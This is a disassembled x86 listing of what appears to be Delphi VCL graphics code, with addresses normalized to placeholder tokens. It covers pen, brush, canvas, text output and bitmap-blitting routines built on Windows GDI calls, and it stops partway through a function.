mov eax [ rw-data ]
call sub_423a1c
xor eax eax
push ebp
push sub_424d86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423a28
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424230
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_424db4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424c68
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_424c80
add esp 0x10
pop esi
pop ebx
retn
sub_424de4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424c68
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_424c80
sub_424e10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423a34
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_424e50
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423b18
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_424e78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419e40
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424274
xor eax eax
push ebp
push sub_424f08
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424274
xor eax eax
push ebp
push sub_424eeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423c58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ef2
mov eax [ ebp - 0x8 ]
call sub_424284
retn
sub_424f20
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424f3c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424274
xor eax eax
push ebp
push sub_424f81
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423bdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f88
mov eax [ ebp - 0x4 ]
call sub_424284
retn
sub_424f8c
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424f3c
add esp 0x10
pop edi
pop esi
retn
sub_424fb8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424f20
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424f3c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424fec
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423a1c
xor edx edx
push ebp
push sub_4250ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423a28
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424230
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_4250d4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424f20
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424f3c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_425108
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_424528
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425968
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424b44
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425988
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e10
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4259a8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
movzx eax [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_419b80
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4251cc
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_419c1c
xor edx edx
mov eax esi
call sub_42579c
mov eax [ esi + 0xc ]
call sub_404650
mov eax [ esi + 0x10 ]
call sub_404650
mov eax [ esi + 0x14 ]
call sub_404650
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_425228
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4257f0
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4252b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
mov eax [ ebx + 0x14 ]
call sub_424fb0
call sub_424230
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424230
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_418448
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42535c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
mov eax [ ebx + 0x14 ]
call sub_424fec
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_425398
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4253f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_425424
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_425460
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_425714
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_42548c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
mov eax ebx
call sub_425460
cmp al 0x1
jne r-xdata
mov esi edi
test esi esi
je r-xdata
mov edx edi
mov eax ebx
call sub_425570
inc eax
add [ ebp - 0x4 ] eax
push 0x0
push esi
mov eax edi
call sub_4059dc
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx edi
mov eax ebx
call sub_425570
mov edx eax
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_4253f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub esi 0x4
mov esi [ esi ]
sub_425528
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
movzx edx [ r-xdata ]
mov eax esi
call sub_4257f0
xor eax eax
mov [ edi ] eax
xor eax eax
mov [ edi + 0x4 ] eax
mov ebx ebp
test ebx ebx
je r-xdata
push edi
push ebx
mov eax ebp
call sub_4059dc
push eax
mov eax [ esi + 0x4 ]
push eax
call GetTextExtentPoint32A
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_425570
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425528
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42558c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425528
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4255ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4255f8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255ff
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_4253d0
sub_425658
push ebx
push esi
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_425680
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_4253f8
pop ecx
pop edx
pop edi
pop esi
retn
sub_4256a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_4256cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_4257f0
mov eax [ ebp + 0x8 ]
call sub_424230
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_425738
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
movzx edx [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_42579c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_425738
mov edx esp
mov eax ebx
call sub_425658
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_425680
sub_4257f0
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx ebx [ esi + 0x8 ]
not ebx
and bl [ esp ]
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_425890
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
test bl 0x8
je r-xdata
mov eax esi
call sub_4258bc
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_4258ec
sub_425890
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_42473c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424230
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_4258bc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_424d00
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_4258ec
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424fec
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424fec
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_4250cc
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424fb0
call sub_424230
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424fb0
call sub_424230
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_425a1c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_425a66
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a6d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_425a70
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_425b0c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_425a1c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4057a0
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b13
lea eax [ ebp - 0x104 ]
call sub_405530
retn
sub_425b28
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_425c76
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425be5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_425a70
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_425a70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c7d
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_425c88
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_425ca8
push ebx
dec ecx
mov ebx eax
imul ebx edx
add ebx ecx
not ecx
and ebx ecx
mov ecx 0x8
mov eax ebx
cdq
idiv ecx
mov ebx eax
mov eax ebx
pop ebx
retn
sub_425cc8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425f3d
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425b18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f44
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425b18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425d90
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xccaa0029
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f44
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425f54
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
movzx ebx [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
movzx ebx [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
movzx ecx [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425f90
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
